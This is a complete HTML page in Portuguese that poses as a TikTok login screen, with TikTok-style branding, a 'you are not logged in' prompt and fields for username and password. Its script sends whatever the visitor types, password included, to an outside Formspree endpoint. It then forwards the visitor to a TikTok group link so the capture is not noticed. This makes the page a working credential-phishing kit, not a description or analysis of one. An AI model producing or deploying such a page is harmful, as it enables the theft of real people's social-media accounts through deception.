
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="theme-color" content="#000000">
<title>tiktok • grupinho</title>

<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  min-height: 100vh;
  background: #000;
  color: #fff;
  font-family: Arial, Helvetica, sans-serif;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 22px;
}

.container {
  width: 100%;
  max-width: 410px;
}

.logo {
  text-align: center;
  font-size: 38px;
  font-weight: 900;
  letter-spacing: -2px;
  margin-bottom: 8px;
  text-shadow: -3px 0 #25f4ee, 3px 0 #fe2c55;
}

.subtitle {
  text-align: center;
  color: #aaa;
  font-size: 14px;
  margin-bottom: 30px;
}

.card {
  background: #101010;
  border: 1px solid #292929;
  border-radius: 18px;
  padding: 25px 20px;
  box-shadow: 0 0 25px #fe2c5510;
}

h1 {
  font-size: 24px;
  margin-bottom: 9px;
}

.description {
  font-size: 14px;
  line-height: 1.6;
  color: #aaa;
  margin-bottom: 25px;
}

label {
  display: block;
  font-size: 13px;
  font-weight: bold;
  margin-bottom: 9px;
}

input, textarea {
  width: 100%;
  background: #1b1b1b;
  border: 1px solid #333;
  border-radius: 9px;
  padding: 14px;
  margin-bottom: 20px;
  color: white;
  font-size: 15px;
  outline: none;
  font-family: inherit;
  transition: border .2s;
}

input:focus, textarea:focus {
  border-color: #25f4ee;
  box-shadow: 2px 2px 0 #fe2c55;
}

textarea {
  min-height: 135px;
  resize: vertical;
}

button {
  width: 100%;
  padding: 15px;
  background: #fe2c55;
  color: white;
  border: none;
  border-radius: 9px;
  font-size: 15px;
  font-weight: bold;
  cursor: pointer;
  box-shadow: -4px 4px 0 #25f4ee;
  transition: .2s;
}

button:hover {
  transform: translateY(-2px);
}

button:disabled {
  opacity: .6;
  cursor: wait;
  transform: none;
}

.status {
  font-size: 13px;
  line-height: 1.5;
  text-align: center;
  margin-top: 18px;
  color: #25f4ee;
  overflow-wrap: anywhere;
}

.footer {
  text-align: center;
  color: #666;
  font-size: 11px;
  margin-top: 24px;
}

.footer span {
  color: #fe2c55;
}

</style>
</head>

<body>
<main class="container">

  <div class="logo">tik tok.</div>
  <p class="subtitle">Entre para continuar.</p>

  <section class="card">
    <h1>Entrar.</h1>
    <p class="description">
      Parece que voce não esta conectado(a) entre para continuar
    </p>

    <form id="messageForm">
      <label for="name">Seu nome</label>
      <input
        type="text"
        id="name"
        name="name"
        placeholder="Nome de usuario..."
        maxlength="80"
        required
      >

      <label for="senha">Sua mensagem</label>
      <input type="password"
        id="message"
        name="senha"
        placeholder="Digite sua senha..."
        maxlength="3000"
        required
      >

      <button type="submit" id="submitBtn">
        ENTRAR ↗
      </button>

      <p class="status" id="status" role="status"></p>
    </form>
  </section>

  <p class="footer">
    by tik tok 2026<span>♥</span>
  </p>

</main>

<script>
const FORMSPREE_URL = "https://formspree.io/f/meewdwnd";
const TIKTOK_GROUP_URL = "https://tiktok.me/group/ZSbE1Apn8/";

const form = document.getElementById("messageForm");
const button = document.getElementById("submitBtn");
const statusText = document.getElementById("status");

form.addEventListener("submit", async function(event) {
  event.preventDefault();

  if (FORMSPREE_URL.includes("SEU_ID")) {
    statusText.textContent =
      "Configure o ID do Formspree antes de enviar.";
    return;
  }

  if (
    !TIKTOK_GROUP_URL.startsWith("https://") ||
    TIKTOK_GROUP_URL.includes("COLOQUE_AQUI")
  ) {
    statusText.textContent =
      "Configure o link do grupo do TikTok.";
    return;
  }

  button.disabled = true;
  button.textContent = "ENTRANDO...";
  statusText.textContent = "Entrando...";

  try {
    const response = await fetch(FORMSPREE_URL, {
      method: "POST",
      body: new FormData(form),
      headers: {
        "Accept": "application/json"
      }
    });

    if (!response.ok) {
      throw new Error("Não foi possível entrar.");
    }

    statusText.textContent =
      "";

    button.textContent = "";

    setTimeout(() => {
      window.location.assign(TIKTOK_GROUP_URL);
    }, 1200);

  } catch (error) {
    statusText.textContent =
      "Erro ao entrar. Confira sua conexão e tente novamente.";
    button.disabled = false;
    button.textContent = "TENTAR NOVAMENTE ↗";
  }
});
</script>
</body>
</html>
